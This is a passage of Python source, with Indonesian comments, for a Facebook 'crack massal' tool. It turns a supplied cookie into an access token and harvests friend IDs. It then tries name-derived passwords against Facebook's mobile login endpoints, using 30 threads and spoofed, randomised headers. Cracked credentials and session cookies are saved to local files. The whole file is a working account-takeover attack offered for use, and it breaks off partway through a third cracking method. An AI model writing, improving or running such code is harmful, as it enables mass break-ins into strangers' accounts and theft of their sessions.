			xr_dev_ = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			xr_dev_1 = json.loads(xr_dev_.text)['name']
			xr_dev_2 = json.loads(xr_dev_.text)['id']
			menu(xr_dev_1,xr_dev_2)
		except KeyError:
			login_back()
		except requests.exceptions.ConnectionError:
			print('Connection Error')
			exit()
	except IOError:
		login_back()

# bagian masuk cookie
def login_back():
	try:
		os.system('clear')
		banner ()
		cookie=input(f'\ncookie :{H} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print(f"\n{D}token : {H}{token}") 
					exit(os.system('python %s'%(sys.argv[0])))

				else:
					print("token failed")

			except:
				print("token failed")

		print(f'sukses login jalankan ulang perintah nya');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'login failed')
		print(e)
		exit()
		
# bagian menu awal
def menu(name,id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('cookie kamu terkena chekpoint masukan ulang cookie baru')
		time.sleep(2)
		login_back()
	os.system('clear')
	banner()
	ip = requests.get("http://ip-api.com/json/").json()["query"]
	kota = requests.get("http://ip-api.com/json/").json()["city"]
	print('')
	print(f'\t     {pesan_selamat} user {H}{name}{D}')
	print('')
	print(f'{B}01{D}.crack id massal') 
	print(f'{B}02{D}.cek hasil ok/cp') 
	print(f'{B}03{D}.keluar/hapus cookie') 
	print('')
	_der_xr_ganteng_ = input(f'pilih {B}1{D}/{B}2{D}/{B}3{D} : ') 
	if _der_xr_ganteng_ in ['1','01']:
		crack_massal()
	elif _der_xr_ganteng_ in ['2','02']:
		cek_result()
	elif _der_xr_ganteng_ in ['3','03']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('Sukses Logout+Hapus Kukis ')
		
# cek result
def cek_result():
	print('')
	print(f'{B}01{D}.cek hasil ok') 
	print(f'{B}02{D}.cek hasil cp') 
	print(f'{B}03{D}.kembali ke menu') 
	print('')
	kz = input(f'pilih {B}1{D}/{B}2{D}/{B}3{D} : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('file tidak di temukan')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('kamu tidak mempunyai hasil cp')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'%s. %s {H}%s{D} id)'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[{cih}] {isi} [{len(hem)} Account ] {x}')
			geeh = input('\npilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('masukan pilihan yang benar')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('file tidak ditemukan')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{D}*---> {K}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'klik enter untuk kembali ke menu awal')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('file tidak ditemukan')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('kamu tidak mempunyai hasil ok')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'%s. %s {H}%s{D} id)'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'%s. %s {H}%s{D} id )'%(cih,isi,(len(hem))))
			geeh = input(f'\npilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('masukan pilihan yang benar')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('file tidak ditemukan')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{D}*---> {H}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'klik enter untuk kembali ke menu awal')
			back()
	elif kz in ['3']:
		back()
	else:
		print('masukan pilihan yang benar')
		back()
		
# crack massal
def crack_massal():    
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    print(f"cookie invalid")
	    exit()           
	try:
		print('') 
		kumpulkan = int(input(f'masukan jumlah id : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'masukan id '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print(f'sukses mengumpulkan {H}{str(len(id))}{D} id ...') 
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()

# setting id dan metode
def setting():
	print('')
	print(f'{B}01{D}.crack dari urutan id old') 
	print(f'{B}02{D}.crack dari urutan id new') 
	print(f'{B}03{D}.crack dari urutan id random') 
	print('')
	hu = input(f'pilih {B}1{D}/{B}2{D}/{B}3{D} : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('masukan pilihan yang benar')
		exit()
	print('')
	print(f'{B}01{D}.https://m.facebook.com ') 
	print(f'{B}02{D}.https://mbasic.facebook.com ') 
	print(f'{B}03{D}.https://mbasic.new ') 
	print('')
	hc = input(f'pilih {B}1{D}/{B}2{D} : ')
	if hc in ['1','01']:
		method.append('metode_1')
	elif hc in ['2','02']:
		method.append('metode_2')
	elif hc in ['3','03']:
		method.append('metode_3')
	elif hc in ['4','04']:
		method.append('metode_4')
	else:
		method.append('metode_1')
	print('') 
	pwplus=input(f'mau menambahkan password manual {B}y{D}/{B}t{D} :  ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()

# list password 
def passwrd():
	global prog,des
	print('')
	print(f'hasil ok save in {H}{okc}{D}')
	print(f'hasil cp save in {K}{cpc}{D}')
	print('')
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345') 
						pwv.append(frs+'21')
						pwv.append(frs+'22')
						pwv.append(frs+'23')
						pwv.append(frs+'24')
						pwv.append(frs+'25')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'21')
						pwv.append(frs+'22')
						pwv.append(frs+'23')
						pwv.append(frs+'24')
						pwv.append(frs+'25')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'metode_1' in method:
					pool.submit(crack_m1,idf,pwv)
				elif 'metode_2' in method:
					pool.submit(crack_m2,idf,pwv)
				elif 'metode_3' in method:
					pool.submit(crack_m3,idf,pwv)
				elif 'metode_4' in method:
					pool.submit(crack_m4,idf,pwv)
				else:
					pool.submit(crack_m4,idf,pwv)
	print('')
	print(f'result ok : {H}%s{D} '%(ok)) 
	print(f'result cp : {K}%s{D} '%(cp))

# metode validate 
def crack_m1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([H,B,U,K])
	prog.update(des,description=f"  mobile.... {loop}/{len(id)} ok:[bold green]{ok}[/] cp:[bold yellow]{cp}[/]")
	prog.advance(des) 
	rr = random.randint
	rc = random.choice
	ua = random.choice(kepang)
	ua2 = random.choice(ugen4)
	ses = requests.Session()
	for pw in pwv:
		try:
			wibu = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.2%2Fdialog%2Foauth%3Fclient_id%3D336194930383773%26redirect_uri%3Dhttps%253A%252F%252Fwww.ferizy.com%252Flogin%252Ffacebook%26state%3D93eada3cc4c46a39842f2ba053c02be2%26sdk%3Dphp-sdk-4.0.20%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D01b787c2-daaf-4c18-85ab-be444d396545%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ferizy.com%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D93eada3cc4c46a39842f2ba053c02be2%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			wibu_data = {
					"lsd": re.search('name="lsd" value="(.*?)"',str(wibu)).group(1),
					"jazoest": re.search('name="jazoest" value="(.*?)"', str(wibu)).group(1),
					"uid": idf,
					"next": f"https://m.facebook.com/v2.2/dialog/oauth?client_id=336194930383773&redirect_uri=https%3A%2F%2Fwww.ferizy.com%2Flogin%2Ffacebook&state=93eada3cc4c46a39842f2ba053c02be2&sdk=php-sdk-4.0.20&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=01b787c2-daaf-4c18-85ab-be444d396545&tp=unspecified",
					"flow": "login_no_pin",
					"pass": pw,
						}
			wibu_head = {
				'authority': 'mbasic.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'accept-encoding': 'gzif,deflate,br',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'cache-control': 'max-age=0',
				'content-length': f'{len(str(wibu_data))}',
				'content-type': 'application/x-www-form-urlencoded',
				'dpr': f'{len(str(wibu_data))}',
				'origin': f'https://mbasic.facebook.com',
				'referer': f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.2%2Fdialog%2Foauth%3Fclient_id%3D336194930383773%26redirect_uri%3Dhttps%253A%252F%252Fwww.ferizy.com%252Flogin%252Ffacebook%26state%3D93eada3cc4c46a39842f2ba053c02be2%26sdk%3Dphp-sdk-4.0.20%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D01b787c2-daaf-4c18-85ab-be444d396545%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ferizy.com%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D93eada3cc4c46a39842f2ba053c02be2%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'sec-ch-prefers-color-scheme': 'light',
				'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,99))}", "Chromium";v="{str(rr(60,124))}"',
				'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(8,99))}.0.0.0", "Chromium";v="{str(rr(60,124))}.0.{str(rr(2000,6999))}.{str(rr(1,399))}"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-model': f'"vivo {str(rr(1000,5999))}"',
				'sec-ch-ua-platform': '"Android"',
				'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
				'sec-fetch-dest': 'document',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-user': '?1',
				'upgrade-insecure-requests': '1',
				'user-agent': ua,
				'viewport-width': '980',
			}
			po = ses.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=wibu_data,headers=wibu_head,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"               ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				cetak(tree) 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree= Tree(f"               ")
				tree.add(f"[bold green]{idf}|{pw}|{kuki}")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def crack_m2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([H,B,U,K])
	prog.update(des,description=f"  mbasic.... {loop}/{len(id)} ok:[bold green]{ok}[/] cp:[bold yellow]{cp}[/]")
	prog.advance(des) 
	rr = random.randint
	rc = random.choice
	ua = random.choice(ugen2)
	ua2 = random.choice(xro)
	ses = requests.Session()
	for pw in pwv:
		try:
			wibu = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid=100028314376207&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D733768086637828%26cbt%3D1717239396131%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df0a91443f3cc382ef%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffaf5966b9b6687d93%2526relation%253Dopener%26client_id%3D733768086637828%26display%3Dtouch%26domain%3Dusers.wix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fusers.wix.com%252Flogo%252Fsignin%252Fsignup%252Fpassword%253Fcolor%253DLOGO%2526loginDialogContext%253Dsignup%2526sendEmail%253Dfalse%2526referralInfo%253DHEADER%2526redirectTo%253Dhttps%25253A%25252F%25252Fmanage.wix.com%25252Flogo%25252Fmaker%25252Fesh%25252Fshorten%25252Fr%25252FYSqE3Ji%2526postSignUp%253Dhttps%25253A%25252F%25252Fmanage.wix.com%25252Flogo%25252Fmaker%25252Fesh%25252Fshorten%25252Fr%25252FYSqE3Ji%2526originUrl%253Dhttps%25253A%25252F%25252Fmanage.wix.com%25252Flogo%25252Fmaker%25252Fesh%2526overrideLocale%253Did%2526customized%253Dlogo_maker%2526forceRender%253Dtrue%26locale%3Did_ID%26logger_id%3Dfaba132ae6a89e543%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4ea85ec6e966a31b%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffaf5966b9b6687d93%2526relation%253Dopener%2526frame%253Dfa909d7ef26814d46%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv15.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&li=WExcZpTqOkuX6awWRq1Y8vM2&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df4ea85ec6e966a31b%26domain%3Dusers.wix.com%26is_canvas%3Dfals').text
			wibu_data = {
					"lsd": re.search('name="lsd" value="(.*?)"',str(wibu)).group(1),
					"jazoest": re.search('name="jazoest" value="(.*?)"', str(wibu)).group(1),
					"uid": idf,
					"next": f"https://m.facebook.com/v15.0/dialog/oauth?app_id=733768086637828&cbt=1717239396131&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df0a91443f3cc382ef%26domain%3Dusers.wix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fusers.wix.com%252Ffaf5966b9b6687d93%26relation%3Dopener&client_id=733768086637828&display=touch&domain=users.wix.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fusers.wix.com%2Flogo%2Fsignin%2Fsignup%2Fpassword%3Fcolor%3DLOGO%26loginDialogContext%3Dsignup%26sendEmail%3Dfalse%26referralInfo%3DHEADER%26redirectTo%3Dhttps%253A%252F%252Fmanage.wix.com%252Flogo%252Fmaker%252Fesh%252Fshorten%252Fr%252FYSqE3Ji%26postSignUp%3Dhttps%253A%252F%252Fmanage.wix.com%252Flogo%252Fmaker%252Fesh%252Fshorten%252Fr%252FYSqE3Ji%26originUrl%3Dhttps%253A%252F%252Fmanage.wix.com%252Flogo%252Fmaker%252Fesh%26overrideLocale%3Did%26customized%3Dlogo_maker%26forceRender%3Dtrue&locale=id_ID&logger_id=faba132ae6a89e543&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df4ea85ec6e966a31b%26domain%3Dusers.wix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fusers.wix.com%252Ffaf5966b9b6687d93%26relation%3Dopener%26frame%3Dfa909d7ef26814d46&response_type=token%2Csigned_request%2Cgraph_domain&scope=email&sdk=joey&version=v15.0&ret=login&fbapp_pres=0&tp=unspecified",
					"flow": "login_no_pin",
					"pass": pw,
						}
			wibu_head = {
				'authority': 'mbasic.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'content-length': f'{len(str(wibu_data))}',
                'dpr': f'{len(str(wibu_data))}',
                'origin': f'https://mbasic.facebook.com',
                'referer': f'https://mbasic.facebook.com/login/device-based/password/?uid=100028314376207&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D733768086637828%26cbt%3D1717239396131%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df0a91443f3cc382ef%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffaf5966b9b6687d93%2526relation%253Dopener%26client_id%3D733768086637828%26display%3Dtouch%26domain%3Dusers.wix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fusers.wix.com%252Flogo%252Fsignin%252Fsignup%252Fpassword%253Fcolor%253DLOGO%2526loginDialogContext%253Dsignup%2526sendEmail%253Dfalse%2526referralInfo%253DHEADER%2526redirectTo%253Dhttps%25253A%25252F%25252Fmanage.wix.com%25252Flogo%25252Fmaker%25252Fesh%25252Fshorten%25252Fr%25252FYSqE3Ji%2526postSignUp%253Dhttps%25253A%25252F%25252Fmanage.wix.com%25252Flogo%25252Fmaker%25252Fesh%25252Fshorten%25252Fr%25252FYSqE3Ji%2526originUrl%253Dhttps%25253A%25252F%25252Fmanage.wix.com%25252Flogo%25252Fmaker%25252Fesh%2526overrideLocale%253Did%2526customized%253Dlogo_maker%2526forceRender%253Dtrue%26locale%3Did_ID%26logger_id%3Dfaba132ae6a89e543%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4ea85ec6e966a31b%2526domain%253Dusers.wix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fusers.wix.com%25252Ffaf5966b9b6687d93%2526relation%253Dopener%2526frame%253Dfa909d7ef26814d46%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv15.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&li=WExcZpTqOkuX6awWRq1Y8vM2&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df4ea85ec6e966a31b%26domain%3Dusers.wix.com%26is_canvas%3Dfalshe%26origin%3Dhttps%253A%252F%252Fusers.wix.com%252Ffaf5966b9b6687d93%26relation%3Dopener%26frame%3Dfa909d7ef26814d46%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&e=1348092&skip_api_login=1&shbl=1&locale2=id_ID&wtsid=rdr_065jv2gNvkUjR3wz9&refsrc=deprecated&rtime=1717324976&subno_key=AaGd7E9JgDZS4mCs9IGFnXRkR6JQgqazggUiE3WIbcHPtN3_ZiVVhbcdFBoSzBGw9u5LDDw7rhquFgkr6YZcw4DcJcZUTwUDaJeQW3uV7-_ONpqQurI_GVhTCV-_qnrWWE7O36SaFyCTSCGbzPPNHEL_WW29h8nSczwjvoQAGkdPbvXAALS5VIdQy-7iLIaAjloD_LBYu64m3D4ueK8lWXew5jqD-8kPCzY0tN8qSOOF3F3YFfOPGeZqReKG6QW8ijm0WPDj1YL6mgbnGemeikd2oV2sC1TQpvvA84ln59JK4rqSFGBxunV8qeq9rYn-k64&hrc=1&_rdr',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,99))}", "Chromium";v="{str(rr(60,124))}"',
                'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(8,99))}.0.0.0", "Chromium";v="{str(rr(60,124))}.0.{str(rr(2000,6999))}.{str(rr(1,399))}"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': f'"vivo {str(rr(1000,5999))}"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
                'viewport-width': '980',
            }
			po = ses.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=wibu_data,headers=wibu_head,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"               ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				cetak(tree) 
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree= Tree(f"               ")
				tree.add(f"[bold green]{idf}|{pw}|{kuki}")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def crack_m3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([H,B,U,K])
	prog.update(des,description=f"  new header.... {loop}/{len(id)} ok:[bold green]{ok}[/] cp:[bold yellow]{cp}[/]")
	prog.advance(des) 
	rr = random.randint
	rc = random.choice
	ua = random.choice(ugen4)
	ua2 = uazku()
	ses = requests.Session()
	for pw in pwv:
		try:
			wibu = ses.get(f'https://m.facebook.com/login.php?skip_api_login=1&api_key=1542246699308023&kid_directed_site=0&app_id=1542246699308023&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D1542246699308023%26cbt%3D1711326940492%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33345f7445b7dfb7%2526domain%253Dvoila.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fvoila.id%25252Ff3a957c03c33f9a9d%2526relation%253Dopener%26client_id%3D1542246699308023%26display%3Dtouch%26domain%3Dvoila.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fvoila.id%252Faccount%252Flogin%26locale%3Den_US%26logger_id%3Df927d4a630f80cea8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9ceae5e3f1fb68f5%2526domain%253Dvoila.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fvoila.id%25252Ff3a957c03c33f9a9d%2526relation%253Dopener%2526frame%253Df9b653a32ccf0bc57%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df9ceae5e3f1fb68f5%26domain%3Dvoila.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fvoila.id%252Ff3a957c03c33f9a9d%26relation%3Dopener%26frame%3Df9b653a32ccf0bc57%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			wibu_data = {
					"lsd": re.search('name="lsd" value="(.*?)"',str(wibu)).group(1),
					"jazoest": re.search('name="jazoest" value="(.*?)"', str(wibu)).group(1),
					"uid": idf,
					"next": f"https://m.facebook.com/v17.0/dialog/oauth?app_id=1542246699308023&cbt=1711326940492&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33345f7445b7dfb7%26domain%3Dvoila.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fvoila.id%252Ff3a957c03c33f9a9d%26relation%3Dopener&client_id=1542246699308023&display=touch&domain=voila.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fvoila.id%2Faccount%2Flogin&locale=en_US&logger_id=f927d4a630f80cea8&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df9ceae5e3f1fb68f5%26domain%3Dvoila.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fvoila.id%252Ff3a957c03c33f9a9d%26relation%3Dopener%26frame%3Df9b653a32ccf0bc57&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&version=v17.0&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified",
					"flow": "login_no_pin",
					"pass": pw,
						}
			wibu_head = {
				'authority': 'm.facebook.com',
                'accept': '*/*',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': f'https://m.facebook.com',
